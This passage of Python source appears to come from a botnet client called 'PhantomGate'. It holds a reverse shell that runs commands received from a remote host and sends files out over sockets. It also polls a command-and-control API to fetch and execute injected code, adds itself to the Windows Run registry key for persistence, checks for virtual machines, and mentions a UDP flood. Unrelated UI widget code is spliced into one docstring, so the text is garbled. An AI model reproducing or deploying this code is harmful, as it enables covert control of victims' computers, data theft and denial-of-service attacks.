    except requests.exceptions.RequestException as e:
        return {
            'error': 'RequestException occurred',
            'details': str(e)
        }


def get_host_port(s1):
    """
    Extracts the IP and PORT from a string formatted as 'IP:PORT'.
    Args:
        s1 (str): The string containing the IP and PORT.
    Returns:
        tuple: A tuple containing the IP and PORT as strings.
    """
    for i in range(0,len(s1)):
        if s1[i] == ":":
            IP = s1[:i]
            PORT = s1[i+1:]

    return IP,PORT

def dir_chacker(_pwd):
    """
    Checks the current working directory and returns the path without the leading directory.
    Args:
        _pwd (str): The command to get the current working directory.
    Returns:
        str: The current working directory without the leading directory.
    """
    cmd = subprocess.Popen(_pwd,shell=True,stdout=subprocess.PIPE,stderr=subprocess.PIPE,stdin=subprocess.PIPE)
    bytes = cmd.stdout.read() + cmd.stderr.read()
    string = str(bytes)
    pwd = string[2:-3]
    ch_point = []

    for x in range(len(pwd)):
        if pwd[x] == "/":
            ch_point.append(x)
    
    f = ch_point[-1] + 1
    ch_point.clear()
    return pwd[f:]
    
    
def server_target(IP, PORT):
    """
    Starts a simple HTTP server to serve files from the current directory.
    Args:
        IP (str): The IP address to bind the server to.
        PORT (int): The port number to bind the server to.
    """
    #creating request handler with variable name handler
    handler = http.server.SimpleHTTPRequestHandler
    #binding the request with the ip and port as httpd
    with socketserver.TCPServer((IP, int(PORT)), handler) as httpd:
        messeage = YELLOW+"Server started at  -> "+IP+":"+PORT+END
        #running the server
        httpd.serve_forever()
            
def send(com,_port):
        """
        Sends a file over a socket connection.
        Args:
            com (str): The path to the file to be sent.
            _port (int): The port number to connect to.
        """
        _s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        host = socket.gethostname()

        try:
            print(_port)
            _s.connect((host,_port))
        except Exception as e:
            pass
        try:
            file_size = str(os.path.getsize(com))
            _s.send(str.encode(file_size))
        
            with open(com,"rb") as files:

                while True:
                    data = files.read(1024)
                    if not (data):
                        break
                    _s.send(data)

        except:
            _s.close()

def socketMain(host,port,threadPermission):
    """
    Main function to establish a socket connection and handle commands.
    It connects to a server, retrieves the current working directory,
    and listens for commands to execute, change directories, or start a server.
    It also handles file downloads and command execution.

    Args:
        host (str): The hostname or IP address to connect to.
        port (int): The port number to connect to.
        threadPermission (str): The permission status for the thread ('Allow' or 'Deny').

    Commands:
        - 'exit' or 'quite': Closes the connection.
        - 'cd <path>': Changes the current working directory to the specified path.
        - 'server <IP:PORT>': Starts a simple HTTP server on the specified IP and port.
        - 'download <file_path>': Sends a file over a socket connection.
        - Any other command: Executes the command in the shell and sends the output back.
    """
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    try:
        s.connect((host, port))
        _pwd = "echo %cd%" if platform == "win32" else "pwd"
        pwd = dir_chacker(_pwd)
        s.send(pwd.encode())

        while threadPermission == 'Allow':
            data = s.recv(1024)
            if not data:
                break

            command = data.decode("utf-8").strip()

            if command in ("exit", "quite"):
                break

            elif command.startswith("cd "):
                path = command[3:].strip()
                try:
                    os.chdir(path)
                    pwd = dir_chacker(_pwd)
                    msg = f"-pwd@-{pwd}"
                except Exception:
                    msg = f"{RED}\n[!][!] Oops! no such directory: {path}{END}"
                s.send(msg.encode())

            elif command.startswith("server "):
                s1 = command[7:].strip()
                IP, PORT = get_host_port(s1)
                message = f"{GREEN}server is running on: {END}{MAGENTA}{IP}:{PORT}{END}"
                threading.Thread(target=server_target, args=(IP, PORT)).start()
                s.send(message.encode())

            elif command.startswith("download "):
                com = command[9:].strip()
                _port = port - 1
                send(com, _port)

            else:
                if command.startswith("ls"):
                    command = f"ls --color {command[3:].strip()}"
                try:
                    proc = subprocess.Popen(command, shell=True,
                                            stdout=subprocess.PIPE,
                                            stderr=subprocess.PIPE,
                                            stdin=subprocess.PIPE)
                    output_bytes = proc.stdout.read() + proc.stderr.read()
                    output_string = output_bytes.decode("utf-8").strip()
                except Exception as e:
                    output_string = f"{RED}[!] Command execution failed: {e}{END}"

                if not output_string:
                    output_string = f"{GREEN}[   {END}{YELLOW}>_< {END}{GREEN}  [DONE!!!]  ]{END}"

                s.send(output_string.encode())

    except Exception as e:
        print(f"[!] Connection error: {e}")
    finally:
        s.close()

    threadPermission = targetData(command='getPermission')[0][1]



def main():
    """
    Main function to handle the API interaction and command execution loop.
    It retrieves target information, processes instructions, and executes commands
    based on the retrieved instructions.
    """
    threadPermission = targetData(command='getPermission')[0][1]
    while threadPermission == 'Allow':
        try:    
            # Retrieve target info
            target_info = targetData(command='get')
            delay = 5

            if len(target_info) != 0:
                target_name = target_info[0][1]
                instraction = Instarction(target_name=target_name, apiToken=apiToken)
                # user instraction section
                if 'user_instarcton' in instraction:
                    if len(instraction['user_instarcton']) != 0:
                        if 'cmd' in instraction['user_instarcton']:
                            cmd = instraction['user_instarcton']['cmd']
                            cmd.insert(0, 'user_instarction')  # Insert a dummy tuple at the start to align indices
                            result = apiCommandPost(token=apiToken, target_name=target_name, data=cmd)
                            print(result)
                        elif 'BotNet' in instraction['user_instarcton']:
                            ...
                print(instraction)
                # Ensure instraction is valid
                if isinstance(instraction, dict) and 'error' not in instraction:
                    delay = int(instraction.get('delay', config.MAIN_LOOP_DELAY))  # Default to 5 if no delay is found

                    if instraction['instraction'].replace(' ','') == 'connectToWeb':
                        cmd = apiCommandGet(target_name=target_name, token=apiToken)
                        if len(cmd) != 0:
                            result = apiCommandPost(token=apiToken, target_name=target_name, data=cmd)

                            if result == 'Invalid':
                                logger.info(f'[apiCommandPost Invalid] {result}')


                    elif instraction['instraction'] == 'codeInjection':
                        # get the pyload name and method=(GET)
                        inject = injection(token=apiToken, target_name=target_name, method='GET')
                        print(inject['message'])
                        if inject['message'] != None:
                            print('i am the prolame')
                            ID = inject['ID']
                            pyload_name = inject['pyload_name']
                            script = inject['script']
                            # excute the code
                            code_output = code_output = code_excuter(script)
                            if code_output:
                                # send the code output to the server
                                response = injection(
                                    token=apiToken, target_name=target_name, 
                                    code_output=code_output, ID=ID,
                                    pyload_name=pyload_name, method='POST'
                                )
                                print(response)
                            else:
                                print('No output from code execution.')
                                return {'message': 'No output from code execution.'}
                    elif instraction['instraction'] == 'connectToSocket':
                        host = instraction['host']
                        port = instraction['port']
                        socketMain(host=host, port=port)

                else:
                    logger.info(f'[apiCommandPost Error] {instraction}')
                    print({'message':f'[apiCommandPost Error] {instraction}'})

            else:
                # Handle case where no target info is available
                user_name = config.ID(n=10)
                data, status_code = Registor(target_name=user_name, apiToken=apiToken)
                if data == 'error':
                    logger.info(f'Error during registration: {data}')
                else:
                    print(data)
                    if status_code == 200:
                        print("****",data)
                        registor_target = targetData(command='create_target', ID=config.ID(n=5), user_name=data['target_name'])
                        if registor_target == "Target was created successfully":
                            logger.info(f'Target {data["target_name"]} was successfully registered')
                        else:
                            logger.info(f'Failed to register target: {registor_target}')

            # Wait before repeating the process
            print('sleeping...')
            retries = 5
            MAX_DELAY = delay
            MIN_DELAY = 0.2*delay
            time.sleep(random.randrange(int(MIN_DELAY),int(MAX_DELAY)))
            threadPermission = targetData(command='getPermission')[0][1]

            # Uncomment the line below to enable socketMain functionality
            # socketMain()
            # Uncomment the line below to enable UDP flood functionality
            # udpFlood(TARGET_IP=get_ip(), THREAD_COUNT=5, PACKET_SIZE=1024)
            # Uncomment the line below to enable libApi functionality
            # libApi(token=apiToken, usePyload='example_script.py', save=True)
            # Uncomment the line below to enable command execution
            # print(CMD(com='ls -l'))  # Example command execution
            # Uncomment the line below to enable file transfer functionality
            # send(com='example_file.txt', _port=8080)  # Example file transfer
            # Uncomment the line below to enable server functionality
            # server_target(IP='127.0.0.1', PORT=8000)  # Example server start
            # Uncomment the line below to enable socketMain functionality
            # socketMain(host='127.0.0.1', PORT=9000)
            # Uncomment the line below to enable targetData functionality
            # print(targetData(command='get'))  # Example target data retrieval
        except Exception as e:
            logger.error(f'An error occurred in main loop: {e}\n{traceback.format_exc()}')
            time.sleep(10)  # Wait before retrying in case of an error
            main()  # Restart the main function in case of an error


def add_to_startup(app_name, app_path=None):
    """
    Adds an application to the Windows startup programs.
        self.height = 100

        with self.canvas.before:
            Color(1, 1, 1, 1)  # White background
            self.rect = RoundedRectangle(size=self.size, pos=self.pos)

        self.bind(size=self.update_rect, pos=self.update_rect)

        self.label = Label(text='', size_hint_y=None, height=40)
        self.add_widget(self.label)

        self.delete_button = Button(text='Delete', size_hint_x=None, width=100)
        self.delete_button.bind(on_release=self.delete_person)
        self.add_widget(self.delete_button)
    :param app_name: The name of the application to be displayed in the startup list.
    :param app_path: The full path to the application executable. If None, uses the current script's path.
    """
    if app_path is None:
        app_path = os.path.realpath(__file__)

    # Open the key where startup programs are listed, for all user use reg.HKEY_LOCAL_MACHINE
    key = reg.OpenKey(reg.HKEY_CURRENT_USER,
                      r"Software\Microsoft\Windows\CurrentVersion\Run",
                      0, reg.KEY_SET_VALUE)
    
    # Add the app to startup
    reg.SetValueEx(key, app_name, 0, reg.REG_SZ, app_path)
    reg.CloseKey(key)



# remove_from_startup("MyAppName")  # Uncomment to remove from startup
# optional to use!!
def remove_from_startup(app_name):
    """
    Removes an application from the Windows startup programs.
    :param app_name: The name of the application to be removed from the startup list.
    """
    key = reg.OpenKey(reg.HKEY_CURRENT_USER,
                      r"Software\Microsoft\Windows\CurrentVersion\Run",
                      0, reg.KEY_SET_VALUE)
    reg.DeleteValue(key, app_name)
    reg.CloseKey(key)


def is_virtual_env():
    """
    Checks if the script is running inside a virtual machine or isolated environment.
    Returns:
        bool: True if running in a VM or container, False otherwise.
    """
    # Check for common VM vendors in system product name
    vm_indicators = [
        "virtualbox", "vmware", "kvm", "qemu", "hyper-v", "xen", "bochs", "parallels", "bhyve"
    ]
    try:
        # Linux: check /sys/class/dmi/id/product_name
        if os.path.exists("/sys/class/dmi/id/product_name"):
            with open("/sys/class/dmi/id/product_name") as f:
                product_name = f.read().lower()
                if any(vm in product_name for vm in vm_indicators):
                    return True
        # Windows: use wmic
        if sys.platform == "win32":
            import subprocess
            try:
                output = subprocess.check_output("wmic computersystem get model", shell=True).decode().lower()
                if any(vm in output for vm in vm_indicators):
                    return True
            except Exception:
                pass
        # Check for container environment
        if os.path.exists("/.dockerenv") or os.path.exists("/.containerenv"):
            return True
        # Check cgroup for docker/lxc
        if os.path.exists("/proc/1/cgroup"):
            with open("/proc/1/cgroup") as f:
                cgroup = f.read()
                if "docker" in cgroup or "lxc" in cgroup:
                    return True
    except Exception:
        pass
    return False

if __name__ == '__main__':
    # Initialize logging
    logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
    # Example usage
    # add_to_startup("PhantomGate", config.APP_PATH)
    # remove_from_startup("MyAppName")
    # Start the main function
    print("Starting PhantomGate...")
    if not config.url:
        print("API URL is not set. Please configure the API URL in config.py.")
    else:
        print(f"Connecting to API at {config.url} with token {apiToken}")
    # Call the main function to start the botnet operations
    if apiToken == 'notSet':
        print("API token is not set. Please configure the API token in config.py.")
    else:
        print(f"Using API token: {apiToken}")
        # Start the main botnet operations
    # Check if running in a virtual machine or isolated environment
    print("Checking if running in a VM or isolated environment...")
    # if not is_virtual_env():
    #     print("Not running in a VM or isolated environment. Exiting.")
    #     sys.exit(0)
    # else:
    print("Running in a VM or isolated environment. Continuing execution.")
    main()
